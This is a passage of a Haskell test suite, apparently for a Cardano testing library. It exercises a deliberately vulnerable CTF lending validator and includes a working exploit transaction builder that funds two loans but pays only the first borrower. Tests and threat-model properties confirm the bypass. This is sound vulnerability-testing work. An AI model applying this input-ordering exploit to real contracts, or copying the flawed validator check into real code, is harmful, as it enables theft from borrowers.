{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE LambdaCase #-}
{-# LANGUAGE NamedFieldPuns #-}
{-# LANGUAGE NumericUnderscores #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE ViewPatterns #-}

{- | Tests for the Aiken-compiled CTF Lending validator using TestingInterface.

This module demonstrates property-based testing of a vulnerable P2P lending contract.
The CTF Lending validator has an INPUT ORDERING BYPASS vulnerability:

== Vulnerability: Input ordering bypass ==

In the 'Lend' action, the validator has this check:

@
or {
  own_ref != first_script_input_ref,   -- If NOT first script input → skip payment check!
  loans_paid_to_borrowers(...)         -- Only verified for first script input
}
@

This means: if a lending script input is NOT the first script input in the transaction,
the payment verification is bypassed entirely. An attacker can:

1. Create two loan requests (Borrower A and Borrower B)
2. Fund both loans in ONE transaction
3. Ensure Borrower A's loan is the first script input (pays correctly)
4. Borrower B's loan gets funded without payment verification!

The attacker only pays the first borrower but claims to have funded both loans.

The Aiken types encode as:
- @Datum { borrower: Address, lender: Option<Address>, borrowed_amount: Int, interest: Int,
           loan_duration: Int, loan_end: Option<Int>, collateral_policy: ByteArray, repaid: Bool }@
- @Redeemer: RequestLoan | Lend | Repay@ = @Constr 0 [] | Constr 1 [] | Constr 2 []@
-}
module AikenLendingSpec (
  -- * TestingInterface model
  LendingModel (..),

  -- * Test tree
  aikenLendingTests,

  -- * Standalone threat model tests
  propLendingVulnerableToInputOrdering,
  propLendingVulnerableToInputDuplication,
) where

import Cardano.Api qualified as C
import Control.Lens ((^.))
import Control.Monad (void)
import Control.Monad.Except (MonadError, runExceptT)
import Control.Monad.IO.Class (MonadIO (..))
import Control.Monad.Trans (lift)
import Convex.Aiken.Blueprint (Blueprint (..))
import Convex.Aiken.Blueprint qualified as Blueprint
import Convex.BuildTx (MonadBuildTx, execBuildTx)
import Convex.BuildTx qualified as BuildTx
import Convex.Class (MonadMockchain, getUtxo)
import Convex.CoinSelection (BalanceTxError, ChangeOutputPosition (TrailingChange))
import Convex.MockChain (fromLedgerUTxO, runMockchain0IOWith)
import Convex.MockChain.CoinSelection (balanceAndSubmit, tryBalanceAndSubmit)
import Convex.MockChain.Defaults qualified as Defaults
import Convex.MockChain.Utils (mockchainSucceeds)
import Convex.NodeParams (ledgerProtocolParameters)
import Convex.PlutusLedger.V1 (transAddressInEra)
import Convex.TestingInterface (
  Options (Options, params),
  RunOptions (mcOptions),
  TestingInterface (..),
  propRunActionsWithOptions,
 )
import Convex.ThreatModel (ThreatModelEnv (..), runThreatModelM)
import Convex.ThreatModel.Cardano.Api (dummyTxId)

import Convex.ThreatModel.InputDuplication (inputDuplication)
import Convex.ThreatModel.UnprotectedScriptOutput (unprotectedScriptOutput)
import Convex.Utils (failOnError)
import Convex.Wallet (Wallet, addressInEra, verificationKeyHash)
import Convex.Wallet.MockWallet qualified as Wallet
import Data.Map qualified as Map
import Data.Maybe (mapMaybe)

import Paths_convex_testing_interface qualified as Pkg
import PlutusLedgerApi.V1 qualified as PV1
import PlutusTx qualified
import PlutusTx.Builtins qualified as PlutusTx

import System.IO.Unsafe (unsafePerformIO)
import Test.QuickCheck.Monadic (monadicIO, monitor, run)
import Test.Tasty (TestTree, testGroup)
import Test.Tasty.HUnit (assertFailure, testCase)
import Test.Tasty.QuickCheck (
  Property,
  counterexample,
  testProperty,
 )
import Test.Tasty.QuickCheck qualified as QC

-- ----------------------------------------------------------------------------
-- Lending Datum and Redeemer types (wire-compatible with Aiken)
-- ----------------------------------------------------------------------------

{- | The datum stored at the ctf_lending script address.

Aiken encodes this as:
@Constr 0 [borrower, lender, borrowed_amount, interest, loan_duration, loan_end, collateral_policy, repaid]@

Fields:
- borrower: Full Plutus Address of the borrower requesting the loan
- lender: Optional address of who funded the loan (None until funded)
- borrowed_amount: Amount requested (in lovelace)
- interest: Interest amount to pay back
- loan_duration: Duration in slots (unused in validator, for off-chain)
- loan_end: Optional slot when loan ends (set when funded)
- collateral_policy: ByteArray for collateral minting policy (unused)
- repaid: Whether the loan has been repaid
-}
data LendingDatum = LendingDatum
  { ldBorrower :: PV1.Address
  -- ^ Address of the borrower
  , ldLender :: Maybe PV1.Address
  -- ^ Address of the lender (None until loan is funded)
  , ldBorrowedAmount :: Integer
  -- ^ Amount borrowed (in lovelace)
  , ldInterest :: Integer
  -- ^ Interest amount
  , ldLoanDuration :: Integer
  -- ^ Loan duration in slots
  , ldLoanEnd :: Maybe Integer
  -- ^ Slot when loan ends (set when funded)
  , ldCollateralPolicy :: PlutusTx.BuiltinByteString
  -- ^ Collateral policy hash
  , ldRepaid :: Bool
  -- ^ Whether loan has been repaid
  }
  deriving stock (Eq, Show)

{- | Actions that can be performed on the lending contract.

Aiken encodes as:
- @RequestLoan = Constr 0 []@
- @Lend = Constr 1 []@
- @Repay = Constr 2 []@
-}
data LendingRedeemer = RequestLoan | Lend | Repay
  deriving stock (Eq, Show)

-- Use TH for ToData/FromData/UnsafeFromData instances
PlutusTx.unstableMakeIsData ''LendingDatum
PlutusTx.unstableMakeIsData ''LendingRedeemer

-- ----------------------------------------------------------------------------
-- Script loading
-- ----------------------------------------------------------------------------

-- | Load the Aiken "ctf_lending" validator from the embedded blueprint
loadLendingScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadLendingScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_lending.ctf_lending.spend" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_lending.ctf_lending.spend not found in Aiken blueprint"

{- | Top-level binding for the Aiken CTF Lending script.

We use 'unsafePerformIO' here because 'TestingInterface.initialState' is a
pure value (not a function), so we cannot pass the script in dynamically.
-}
{-# NOINLINE lendingScript #-}
lendingScript :: C.PlutusScript C.PlutusScriptV3
lendingScript = unsafePerformIO loadLendingScript

-- | Helper to wrap PlutusScript as Script (for hashScript)
plutusScript :: C.PlutusScript C.PlutusScriptV3 -> C.Script C.PlutusScriptV3
plutusScript = C.PlutusScript C.PlutusScriptV3

-- | Hash of the ctf_lending script
lendingScriptHash :: C.ScriptHash
lendingScriptHash = C.hashScript (plutusScript lendingScript)

-- | Address of the ctf_lending script on the default network
lendingAddress :: C.AddressInEra C.ConwayEra
lendingAddress =
  C.makeShelleyAddressInEra
    C.shelleyBasedEra
    Defaults.networkId
    (C.PaymentCredentialByScript lendingScriptHash)
    C.NoStakeAddress

-- ----------------------------------------------------------------------------
-- Helper to convert wallet to Plutus address
-- ----------------------------------------------------------------------------

-- | Get wallet Plutus address
walletPlutusAddress :: Wallet -> PV1.Address
walletPlutusAddress w =
  let addr = addressInEra @C.ConwayEra Defaults.networkId w
   in case transAddressInEra addr of
        Just a -> a
        Nothing -> error "Failed to convert wallet address to Plutus address"

-- | Convert Plutus address back to Cardano address
plutusToCardanoAddress :: PV1.Address -> C.AddressInEra C.ConwayEra
plutusToCardanoAddress plutusAddr =
  let cred = case PV1.addressCredential plutusAddr of
        PV1.PubKeyCredential pkh ->
          C.PaymentCredentialByKey $ fromPubKeyHash pkh
        PV1.ScriptCredential sh ->
          C.PaymentCredentialByScript $ fromScriptHash sh
   in C.makeShelleyAddressInEra
        C.shelleyBasedEra
        Defaults.networkId
        cred
        C.NoStakeAddress
 where
  fromPubKeyHash (PV1.PubKeyHash bs) =
    case C.deserialiseFromRawBytes (C.AsHash C.AsPaymentKey) (PlutusTx.fromBuiltin bs) of
      Right h -> h
      Left _ -> error "Invalid pubkey hash"

  fromScriptHash (PV1.ScriptHash bs) =
    case C.deserialiseFromRawBytes C.AsScriptHash (PlutusTx.fromBuiltin bs) of
      Right h -> h
      Left _ -> error "Invalid script hash"

-- ----------------------------------------------------------------------------
-- Transaction builders
-- ----------------------------------------------------------------------------

{- | Create a loan request: borrower locks collateral (minimal ADA) at the script.

The borrower specifies how much they want to borrow and the interest rate.
-}
requestLoan
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> Wallet
  -- ^ Borrower wallet
  -> C.Lovelace
  -- ^ Amount to borrow
  -> C.Lovelace
  -- ^ Interest amount
  -> C.Lovelace
  -- ^ Collateral value to lock
  -> m ()
requestLoan networkId borrower borrowedAmount interest collateralValue = do
  let borrowerAddr = walletPlutusAddress borrower
      borrowerPkh = verificationKeyHash borrower
      datum =
        LendingDatum
          { ldBorrower = borrowerAddr
          , ldLender = Nothing
          , ldBorrowedAmount = fromIntegral borrowedAmount
          , ldInterest = fromIntegral interest
          , ldLoanDuration = 1000 -- 1000 slots
          , ldLoanEnd = Nothing
          , ldCollateralPolicy = ""
          , ldRepaid = False
          }
  BuildTx.addRequiredSignature borrowerPkh
  BuildTx.payToScriptInlineDatum
    networkId
    lendingScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue collateralValue)

{- | Lend funds: spend the loan request UTxO and pay the borrower.

This is the normal lending flow where the lender:
1. Spends the loan request UTxO
2. Pays the borrowed amount to the borrower
3. Creates a continuation with updated datum (lender set, loan_end set)

NOTE: Specialized to ConwayEra because plutusToCardanoAddress produces ConwayEra addresses.
-}
lendFunds
  :: forall m
   . (MonadBuildTx C.ConwayEra m)
  => C.NetworkId
  -> C.TxIn
  -- ^ The loan request UTxO to spend
  -> LendingDatum
  -- ^ Current datum
  -> C.Value
  -- ^ Current value locked
  -> Wallet
  -- ^ Lender wallet
  -> m ()
lendFunds networkId txIn oldDatum currentValue lender = do
  let lenderAddr = walletPlutusAddress lender
      borrowerAddrC = plutusToCardanoAddress (ldBorrower oldDatum)
      borrowedAmount = fromInteger (ldBorrowedAmount oldDatum) :: C.Lovelace
      -- Update datum with lender info
      newDatum =
        oldDatum
          { ldLender = Just lenderAddr
          , ldLoanEnd = Just 1000 -- Set loan end slot
          }
      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            lendingScript
            (C.ScriptDatumForTxIn Nothing)
            Lend
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  -- Pay the borrower the borrowed amount
  BuildTx.payToAddress borrowerAddrC (C.lovelaceToValue borrowedAmount)
  -- Create continuation with updated datum
  BuildTx.payToScriptInlineDatum
    networkId
    lendingScriptHash
    newDatum
    C.NoStakeAddress
    currentValue

{- | Lend funds to MULTIPLE loan requests in one transaction (exploit).

This exploits the input ordering vulnerability:
- Only the FIRST script input's payment is verified
- All subsequent inputs bypass the payment check!

The attacker:
1. Provides inputs in specific order (first one pays correctly)
2. Second and subsequent inputs don't need to pay borrowers

NOTE: Specialized to ConwayEra because plutusToCardanoAddress produces ConwayEra addresses.
-}
lendFundsExploit
  :: forall m
   . (MonadBuildTx C.ConwayEra m)
  => C.NetworkId
  -> C.TxIn
  -- ^ First loan request (will pay correctly)
  -> LendingDatum
  -- ^ First loan datum
  -> C.Value
  -- ^ First loan value
  -> C.TxIn
  -- ^ Second loan request (payment bypassed!)
  -> LendingDatum
  -- ^ Second loan datum
  -> C.Value
  -- ^ Second loan value
  -> Wallet
  -- ^ Lender/attacker wallet
  -> m ()
lendFundsExploit networkId txIn1 datum1 value1 txIn2 datum2 value2 lender = do
  let lenderAddr = walletPlutusAddress lender
      -- First borrower's address - they get paid
      borrower1AddrC = plutusToCardanoAddress (ldBorrower datum1)
      borrowedAmount1 = fromInteger (ldBorrowedAmount datum1) :: C.Lovelace
      -- Second borrower's address - they DON'T get paid!
      -- borrower2AddrC = plutusToCardanoAddress (ldBorrower datum2)
      -- borrowedAmount2 = fromInteger (ldBorrowedAmount datum2) :: C.Lovelace

      -- Updated datums
      newDatum1 =
        datum1
          { ldLender = Just lenderAddr
          , ldLoanEnd = Just 1000
          }
      newDatum2 =
        datum2
          { ldLender = Just lenderAddr
          , ldLoanEnd = Just 1000
          }

      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            lendingScript
            (C.ScriptDatumForTxIn Nothing)
            Lend

  BuildTx.setScriptsValid

  -- Add FIRST input - this one's payment will be verified
  BuildTx.addInputWithTxBody txIn1 witness

  -- Add SECOND input - this one's payment is BYPASSED!
  BuildTx.addInputWithTxBody txIn2 witness

  -- Pay ONLY the first borrower
  BuildTx.payToAddress borrower1AddrC (C.lovelaceToValue borrowedAmount1)

  -- NOTE: We intentionally DON'T pay the second borrower!
  -- The exploit works because the validator only checks payment for first script input.

  -- Create continuations for both loans (marking them as funded)
  BuildTx.payToScriptInlineDatum
    networkId
    lendingScriptHash
    newDatum1
    C.NoStakeAddress
    value1

  BuildTx.payToScriptInlineDatum
    networkId
    lendingScriptHash
    newDatum2
    C.NoStakeAddress
    value2

{- | Repay the loan: borrower pays back principal + interest to lender.

NOTE: This function is specialized to ConwayEra because plutusToCardanoAddress
produces C.AddressInEra C.ConwayEra.
-}
repayLoan
  :: forall m
   . (MonadBuildTx C.ConwayEra m)
  => C.TxIn
  -- ^ The loan UTxO to spend
  -> LendingDatum
  -- ^ Current datum
  -> Wallet
  -- ^ Borrower wallet
  -> m ()
repayLoan txIn datum borrower = do
  let borrowerPkh = verificationKeyHash borrower
      -- Lender must be set
      lenderAddrC = case ldLender datum of
        Just a -> plutusToCardanoAddress a
        Nothing -> error "Cannot repay: loan not yet funded"
      repaymentAmount = fromInteger (ldBorrowedAmount datum + ldInterest datum) :: C.Lovelace
      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            lendingScript
            (C.ScriptDatumForTxIn Nothing)
            Repay
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  BuildTx.addRequiredSignature borrowerPkh
  -- Pay the lender the repayment amount
  BuildTx.payToAddress lenderAddrC (C.lovelaceToValue repaymentAmount)

-- ----------------------------------------------------------------------------
-- Helper to find script UTxOs
-- ----------------------------------------------------------------------------

-- | Find all UTxOs at the ctf_lending script address
findLendingUtxos
  :: (MonadMockchain C.ConwayEra m)
  => m [(C.TxIn, C.Value, LendingDatum)]
findLendingUtxos = do
  utxoSet <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo
  let C.UTxO utxos = utxoSet
      scriptUtxos = Map.filter (\(C.TxOut addr _ _ _) -> addr == lendingAddress) utxos
  pure $ mapMaybe extractData $ Map.toList scriptUtxos
 where
  extractData (txIn, C.TxOut _ txOutValue datum _) =
    case txOutValue of
      C.TxOutValueShelleyBased _ val ->
        let value = C.fromMaryValue val
            d = case datum of
              C.TxOutDatumInline _ scriptData ->
                PlutusTx.unsafeFromBuiltinData @LendingDatum
                  (PlutusTx.dataToBuiltinData $ C.toPlutusData $ C.getScriptData scriptData)
              _ -> error "Expected inline datum"
         in Just (txIn, value, d)
      C.TxOutValueByron _ -> Nothing

-- ----------------------------------------------------------------------------
-- Unit tests
-- ----------------------------------------------------------------------------

aikenLendingUnitTests :: TestTree
aikenLendingUnitTests =
  testGroup
    "ctf lending unit tests"
    [ testCase "create loan request" $
        mockchainSucceeds $
          failOnError $ do
            let txBody = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 50_000_000 5_000_000 10_000_000
            void $ tryBalanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
            -- Verify UTxO exists at script address
            result <- findLendingUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((_, _, datum) : _) -> do
                liftIO $
                  if ldBorrowedAmount datum == 50_000_000 && ldLender datum == Nothing
                    then pure ()
                    else assertFailure $ "Wrong datum state: " ++ show datum
    , testCase "normal flow: request -> lend -> repay" $
        mockchainSucceeds $
          failOnError $ do
            -- Borrower (w1) creates a loan request
            let requestTxBody = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 50_000_000 5_000_000 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 requestTxBody TrailingChange []

            -- Lender (w2) funds the loan
            result1 <- findLendingUtxos
            case result1 of
              [] -> liftIO $ assertFailure "Expected loan request UTxO"
              ((txIn1, value1, datum1) : _) -> do
                let lendTxBody = execBuildTx $ lendFunds Defaults.networkId txIn1 datum1 value1 Wallet.w2
                _ <- tryBalanceAndSubmit mempty Wallet.w2 lendTxBody TrailingChange []

                -- Verify loan is now funded
                result2 <- findLendingUtxos
                case result2 of
                  [] -> liftIO $ assertFailure "Expected funded loan UTxO"
                  ((_, _, datum2) : _) -> do
                    liftIO $
                      case ldLender datum2 of
                        Just _ -> pure ()
                        Nothing -> assertFailure "Loan should have lender set"

                    -- Borrower (w1) repays the loan
                    result3 <- findLendingUtxos
                    case result3 of
                      [] -> liftIO $ assertFailure "Expected loan UTxO for repayment"
                      ((txIn3, _, datum3) : _) -> do
                        let repayTxBody = execBuildTx $ repayLoan txIn3 datum3 Wallet.w1
                        void $ tryBalanceAndSubmit mempty Wallet.w1 repayTxBody TrailingChange []

                        -- Verify loan UTxO is consumed
                        result4 <- findLendingUtxos
                        case result4 of
                          [] -> pure () -- Success - loan is repaid and UTxO consumed
                          _ -> liftIO $ assertFailure "Loan UTxO should be consumed after repayment"
    , testCase "EXPLOIT: input ordering bypass - fund two loans, pay only one" $
        -- This demonstrates the input ordering vulnerability!
        -- We create TWO loan requests, then fund BOTH in one transaction.
        -- Only the FIRST borrower gets paid, the second is cheated!
        mockchainSucceeds $
          failOnError $ do
            -- Borrower 1 (w1) creates a loan request for 50 ADA
            let request1TxBody = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 50_000_000 5_000_000 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 request1TxBody TrailingChange []

            -- Borrower 2 (w2) creates a loan request for 100 ADA
            let request2TxBody = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w2 100_000_000 10_000_000 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w2 request2TxBody TrailingChange []

            -- Find both loan requests
            result <- findLendingUtxos
            case result of
              ((txIn1, value1, datum1) : (txIn2, value2, datum2) : _) -> do
                -- Verify we have two different loan requests
                liftIO $ do
                  if ldBorrower datum1 /= ldBorrower datum2
                    then pure ()
                    else assertFailure "Expected two different borrowers"

                -- Attacker (w3) exploits: funds BOTH loans but only pays FIRST borrower
                -- Order inputs so w1's loan is first (w1 gets paid), w2's loan is second (bypassed!)
                let (first, firstV, firstD, second, secondV, secondD) =
                      if ldBorrowedAmount datum1 == 50_000_000
                        then (txIn1, value1, datum1, txIn2, value2, datum2)
                        else (txIn2, value2, datum2, txIn1, value1, datum1)

                let exploitTxBody = execBuildTx $ lendFundsExploit Defaults.networkId first firstD firstV second secondD secondV Wallet.w3

                -- This SHOULD fail if the validator was secure, but it SUCCEEDS!
                void $ tryBalanceAndSubmit mempty Wallet.w3 exploitTxBody TrailingChange []

                -- Verify BOTH loans are now marked as funded
                result2 <- findLendingUtxos
                liftIO $ do
                  let fundedCount = length $ filter (\(_, _, d) -> ldLender d /= Nothing) result2
                  if fundedCount == 2
                    then pure () -- Exploit worked! Both loans funded but only one borrower paid
                    else assertFailure $ "Expected 2 funded loans, got: " ++ show fundedCount
              _ -> liftIO $ assertFailure "Expected at least 2 loan request UTxOs"
    , testCase "multiple loan requests from same borrower" $
        mockchainSucceeds $
          failOnError $ do
            -- Borrower creates two loan requests
            let request1 = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000 2_000_000 5_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 request1 TrailingChange []

            let request2 = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 30_000_000 3_000_000 5_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 request2 TrailingChange []

            -- Verify both requests exist
            result <- findLendingUtxos
            liftIO $
              if length result == 2
                then pure ()
                else assertFailure $ "Expected 2 loan requests, got: " ++ show (length result)
    ]

-- ----------------------------------------------------------------------------
-- Standalone Threat Model Tests
-- ----------------------------------------------------------------------------

{- | Test that the lending contract is vulnerable to input ordering bypass.

This demonstrates the vulnerability: when multiple lending script inputs are spent
in one transaction, only the FIRST input's payment check is enforced.

The test:
1. Creates two loan requests (different borrowers)
2. Funds both in one transaction, but only pays the first borrower
3. Verifies the transaction succeeds (vulnerability exists!)

This test returns True when the vulnerability is confirmed.
-}
propLendingVulnerableToInputOrdering :: RunOptions -> Property
propLendingVulnerableToInputOrdering opts = monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    -- Create loan request from w1
    let request1 = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 50_000_000 5_000_000 10_000_000
    _ <- tryBalanceAndSubmit mempty Wallet.w1 request1 TrailingChange []

    -- Create loan request from w2
    let request2 = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w2 100_000_000 10_000_000 10_000_000
    _ <- tryBalanceAndSubmit mempty Wallet.w2 request2 TrailingChange []

    -- Find both loan requests
    loans <- findLendingUtxos
    case loans of
      ((txIn1, value1, datum1) : (txIn2, value2, datum2) : _) -> do
        -- Order inputs so the smaller loan (w1's 50 ADA) is first
        let (first, firstV, firstD, second, secondV, secondD) =
              if ldBorrowedAmount datum1 <= ldBorrowedAmount datum2
                then (txIn1, value1, datum1, txIn2, value2, datum2)
                else (txIn2, value2, datum2, txIn1, value1, datum1)

        -- Capture UTxO before exploit
        utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

        -- Exploit: fund both loans but only pay first borrower
        let exploitTxBody = execBuildTx $ lendFundsExploit Defaults.networkId first firstD firstV second secondD secondV Wallet.w3
        exploitTx <- tryBalanceAndSubmit mempty Wallet.w3 exploitTxBody TrailingChange []

        -- If we get here, the vulnerability exists!
        pure (exploitTx, utxoBefore)
      _ -> fail "Expected at least 2 loan request UTxOs"

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      -- If the transaction FAILED, then the script is NOT vulnerable
      pure $ QC.property False
    (Right (_, _), _finalState) -> do
      monitor (counterexample "Testing ctf_lending for input ordering bypass vulnerability")
      -- The exploit SUCCEEDED - vulnerability confirmed!
      pure $ QC.property True

{- | Run a lending scenario for threat model testing.

Creates a normal lending transaction that produces a continuation output.
-}
lendingScenario
  :: ( MonadMockchain C.ConwayEra m
     , MonadError (BalanceTxError C.ConwayEra) m
     , MonadFail m
     )
  => m (C.Tx C.ConwayEra, C.UTxO C.ConwayEra)
lendingScenario = do
  -- Borrower creates loan request
  let requestTxBody = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 50_000_000 5_000_000 10_000_000
  _ <- tryBalanceAndSubmit mempty Wallet.w1 requestTxBody TrailingChange []

  -- Capture UTxO BEFORE lending
  utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

  -- Lender funds the loan
  result <- findLendingUtxos
  case result of
    [] -> fail "Expected loan request UTxO"
    ((txIn, value, datum) : _) -> do
      -- Use w1 for balance because threat model rebalancer uses w1
      let lendTxBody = execBuildTx $ lendFunds Defaults.networkId txIn datum value Wallet.w2
      lendTx <- tryBalanceAndSubmit mempty Wallet.w1 lendTxBody TrailingChange []
      pure (lendTx, utxoBefore)

{- | Test unprotectedScriptOutput threat model on the lending contract.

The Lend action creates a continuation output. This test checks if that
output can be redirected to the signer (attacker) while preserving the datum.
-}
propLendingUnprotectedOutput :: RunOptions -> Property
propLendingUnprotectedOutput opts = monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    (tx, utxo) <- lendingScenario

    let pparams' = params ^. ledgerProtocolParameters
        env =
          ThreatModelEnv
            { currentTx = tx
            , currentUTxOs = utxo
            , pparams = pparams'
            }

    -- Run the threat model INSIDE MockchainT with full Phase 1 + Phase 2 validation
    lift $ runThreatModelM Wallet.w1 unprotectedScriptOutput [env]

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      pure $ QC.property False
    (Right prop, _finalState) -> do
      monitor (counterexample "Testing ctf_lending for unprotected script output vulnerability")
      pure prop

{- | Test inputDuplication threat model on the lending contract.

This threat model:
1. Sets up TWO unfunded loan requests at the lending script address
2. Creates a valid Fund transaction for ONE loan
3. The threat model finds the second loan UTxO and adds it as another input
4. Tests if the modified transaction validates (exploiting input ordering vulnerability)

Note: Currently this test PASSES because the modified transaction fails validation
due to execution unit constraints (the threat model uses ExecutionUnits 0 0 for the
new input). The underlying input ordering vulnerability DOES exist (as demonstrated
by the explicit exploit test), but the threat model infrastructure cannot currently
detect it due to script execution budget limitations.

TODO: Fix the inputDuplication threat model to properly calculate execution units
for added script inputs, which would allow detection of this vulnerability class.
-}
propLendingVulnerableToInputDuplication :: RunOptions -> Property
propLendingVulnerableToInputDuplication opts = monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    -- Create loan request from w1 (will be funded)
    let request1 = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 50_000_000 5_000_000 10_000_000
    _ <- tryBalanceAndSubmit mempty Wallet.w1 request1 TrailingChange []

    -- Create loan request from w2 (will be the "extra" input for threat model)
    let request2 = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w2 100_000_000 10_000_000 10_000_000
    _ <- tryBalanceAndSubmit mempty Wallet.w2 request2 TrailingChange []

    -- Find both loan requests
    loans <- findLendingUtxos
    case loans of
      ((txIn1, value1, datum1) : _secondLoan : _) -> do
        -- Capture UTxO BEFORE funding (includes both loan UTxOs)
        utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

        -- Fund ONLY the first loan with a valid transaction
        let lendTxBody = execBuildTx $ lendFunds Defaults.networkId txIn1 datum1 value1 Wallet.w3
        lendTx <- tryBalanceAndSubmit mempty Wallet.w3 lendTxBody TrailingChange []

        let pparams' = params ^. ledgerProtocolParameters
            env =
              ThreatModelEnv
                { currentTx = lendTx
                , currentUTxOs = utxoBefore
                , pparams = pparams'
                }

        -- Run inputDuplication threat model
        -- It should find the second loan UTxO and try adding it as another input
        lift $ runThreatModelM Wallet.w1 inputDuplication [env]
      _ -> fail "Expected at least 2 loan request UTxOs"

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      pure $ QC.property False
    (Right prop, _finalState) -> do
      monitor (counterexample "Testing ctf_lending for input duplication vulnerability")
      pure prop

-- ----------------------------------------------------------------------------
-- TestingInterface instance
-- ----------------------------------------------------------------------------

-- | Model state for the CTF Lending contract
data LendingModel = LendingModel
  { lmInitialized :: Bool
  -- ^ Whether a loan request has been created
  , lmTxIn :: Maybe C.TxIn
  -- ^ The UTxO at the script (simplified - only track one loan)
  , lmValue :: C.Lovelace
  -- ^ Value locked in the loan
  , lmBorrower :: Maybe PV1.Address
  -- ^ Borrower address
  , lmLender :: Maybe PV1.Address
  -- ^ Lender address (Nothing if unfunded)
  , lmBorrowedAmount :: C.Lovelace
  -- ^ Amount requested
  , lmInterest :: C.Lovelace
  -- ^ Interest amount
  , lmRepaid :: Bool
  -- ^ Whether the loan has been repaid
  }
  deriving stock (Show, Eq)

instance TestingInterface LendingModel where
  -- Actions for Lending: request, lend, repay
  data Action LendingModel
    = RequestLoanAction C.Lovelace C.Lovelace
    | -- \^ Request loan with borrowed_amount and interest
      LendAction
    | -- \^ Lender funds the loan
      RepayAction
    -- \^ Borrower repays the loan
    deriving stock (Show, Eq)

  initialState =
    LendingModel
      { lmInitialized = False
      , lmTxIn = Nothing
      , lmValue = 0
      , lmBorrower = Nothing
      , lmLender = Nothing
      , lmBorrowedAmount = 0
      , lmInterest = 0
      , lmRepaid = False
      }

  -- Generate actions based on state
  -- Init-type actions (RequestLoanAction): TIGHT - only when not initialized
  -- Non-init actions (LendAction, RepayAction): BROAD - for negative testing
  arbitraryAction model
    | not (lmInitialized model) && not (lmRepaid model) =
        RequestLoanAction
          <$> (fromInteger <$> QC.choose (10_000_000, 100_000_000))
          <*> (fromInteger <$> QC.choose (1_000_000, 10_000_000))
    | otherwise =
        QC.frequency
          [ (5, pure LendAction)
          , (5, pure RepayAction)
          ]

  precondition model (RequestLoanAction _ _) = not (lmInitialized model) && not (lmRepaid model)
  precondition model LendAction = lmInitialized model && lmLender model == Nothing
  precondition model RepayAction = lmInitialized model && lmLender model /= Nothing && not (lmRepaid model)

  nextState model action = case action of
    RequestLoanAction borrowed interest ->
      model
        { lmInitialized = True
        , lmTxIn = Just (C.TxIn dummyTxId (C.TxIx 0))
        , lmValue = 10_000_000 -- Collateral
        , lmBorrower = Just (walletPlutusAddress Wallet.w1)
        , lmLender = Nothing
        , lmBorrowedAmount = borrowed
        , lmInterest = interest
        , lmRepaid = False
        }
    LendAction ->
      model
        { lmLender = Just (walletPlutusAddress Wallet.w2)
        }
    RepayAction ->
      model
        { lmInitialized = False
        , lmTxIn = Nothing
        , lmValue = 0
        , lmBorrower = Nothing
        , lmLender = Nothing
        , lmBorrowedAmount = 0
        , lmInterest = 0
        , lmRepaid = True
        }

  perform _model action = case action of
    RequestLoanAction borrowed interest -> do
      let txBody = execBuildTx $ requestLoan @C.ConwayEra Defaults.networkId Wallet.w1 borrowed interest 10_000_000
      runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
        Left err -> fail $ "Failed to request loan: " ++ show err
        Right _ -> pure ()
    LendAction -> do
      result <- findLendingUtxos
